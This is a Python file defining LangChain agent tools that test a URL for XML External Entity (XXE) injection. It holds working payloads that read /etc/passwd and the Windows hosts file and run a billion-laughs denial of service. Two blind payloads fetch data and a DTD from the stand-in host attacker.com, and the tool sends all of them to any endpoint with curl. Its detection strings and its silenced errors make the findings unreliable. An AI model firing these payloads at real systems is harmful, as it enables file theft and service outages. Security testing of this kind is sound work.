"""
XML External Entity (XXE) Injection Tester
Tests for XXE vulnerabilities in XML parsing endpoints
"""

from langchain.tools import tool
import subprocess
import re
import tempfile
import os


XXE_PAYLOADS = {
    "file_read": {
        "description": "Basic XXE file read",
        "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'''
    },
    "file_read_windows": {
        "description": "XXE file read Windows",
        "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:\\Windows\\System32\\drivers\\etc\\hosts">]>
<root>&xxe;</root>'''
    },
    "billion_laughs": {
        "description": "Billion laughs DoS",
        "payload": '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>'''
    },
    "blind_xxe": {
        "description": "Blind XXE with out-of-band data",
        "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/exfil.txt">]>
<root>&xxe;</root>'''
    },
    "parameter_entity": {
        "description": "Parameter entity XXE",
        "payload": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&xxe;</root>'''
    }
}


@tool
def test_xxe_injection(url: str) -> dict:
    """
    Test XML endpoints for XXE vulnerabilities
    
    Args:
        url: Target URL expecting XML content
    
    Returns:
        Dictionary with XXE findings
    """
    findings = {
        "vulnerable": False,
        "findings": [],
        "payloads_attempted": 0,
        "evidence": []
    }
    
    for payload_name, payload_info in XXE_PAYLOADS.items():
        findings["payloads_attempted"] += 1
        payload = payload_info["payload"]
        description = payload_info["description"]
        
        try:
            # Create temporary file with XXE payload
            with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False) as f:
                f.write(payload)
                temp_file = f.name
            
            # Send payload to endpoint
            result = subprocess.run(
                ["curl", "-s", "-m", "5", "-H", "Content-Type: application/xml",
                 "-d", f"@{temp_file}", url],
                capture_output=True,
                timeout=10,
                text=True
            )
            
            response = result.stdout + result.stderr
            
            # Check for XXE indicators
            xxe_indicators = [
                "root:", "Administrator", "SYSTEM",  # File content
                "DOCTYPE", "ENTITY",  # XXE reflection
                "entity", "external",  # Error messages
            ]
            
            if any(indicator in response for indicator in xxe_indicators):
                findings["vulnerable"] = True
                findings["findings"].append(f"XXE vulnerability: {description}")
                findings["evidence"].append({
                    "payload_type": payload_name,
                    "response": response[:500]
                })
            
            os.unlink(temp_file)
            
        except Exception as e:
            pass
    
    return findings


@tool
def quick_xxe_check(url: str) -> dict:
    """Quick XXE vulnerability screening"""
    return test_xxe_injection(url)
